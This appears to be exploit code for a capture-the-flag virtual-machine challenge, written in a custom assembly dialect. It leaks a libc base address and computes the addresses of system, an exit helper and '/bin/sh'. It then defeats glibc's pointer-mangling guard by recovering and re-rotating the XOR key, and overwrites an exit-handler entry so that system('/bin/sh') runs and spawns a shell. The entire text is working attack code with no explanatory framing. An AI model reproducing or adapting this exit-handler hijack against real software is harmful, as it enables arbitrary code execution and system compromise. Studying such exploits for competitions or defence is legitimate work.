
 start:
    mov eax, [0]
    # get libc addr
    mov eax, [0x1087958]
    prn eax
    mov ebx, [0x1087959]
    prn ebx
    mov [0], eax # libc offset low
    mov [1], ebx # libc offset high

    # get addr of system
    sub eax, 0x1905c0
    add eax, 0x2000
    prn eax
    mov [2], eax # libc system low
    mov [3], ebx # libc system high

    # get addr of exit helper
    mov eax, [0]
    mov ebx, [1]
    add eax, 0x4ed20
    prn eax
    mov [4], eax # libc exit low
    mov [5], ebx # libc exit high

    # get addr of /bin/sh
    mov eax, [0]
    mov ebx, [1]
    sub eax, 0x8c88
    prn eax
    mov [10], eax # /bin/sh low
    mov [11], ebx # /bin/sh high

    # get xor value
    mov esi, [0x1087bc2]
    prn esi
    mov edi, [0x1087bc3]
    prn edi
    mov [6], esi # xor val low
    mov [7], edi # xor val high
    
    # shift both parts right by 11
    shr esi, 17
    and esi, 0x00007fff
    shl edi, 15
    or  esi, edi
    prn esi
    mov [8], esi # rotated xor val low

    mov esi, [6] # original xor val low
    mov edi, [7] # original xor val high
    shr edi, 17
    and edi, 0x00007fff
    shl esi, 15
    or  edi, esi
    prn edi
    mov [9], edi # rotated xor val high

    # xor the value with system and the old exit function
    mov eax, [8]
    mov ebx, [2]
    mov ecx, [4]
    xor eax, ebx
    xor eax, ecx
    mov [8], eax

    # rotate the xor key back
    mov esi, [8]
    mov edi, [9]
    shl esi, 17
    shr edi, 15
    and edi, 0x0001ffff
    or  esi, edi
    prn esi
    mov [6], esi

    # rotate the xor key back
    mov esi, [8]
    mov edi, [9]
    shl edi, 17
    shr esi, 15
    and esi, 0x0001ffff
    or  edi, esi
    prn edi
    mov [7], edi

    # write new xor value back
    mov esi, [6]
    mov edi, [7]
    mov [0x1087bc2], esi
    mov [0x1087bc3], edi

    # write argument to system
    mov esi, [10]
    mov edi, [11]
    mov [0x1087bc4], esi
    mov [0x1087bc5], edi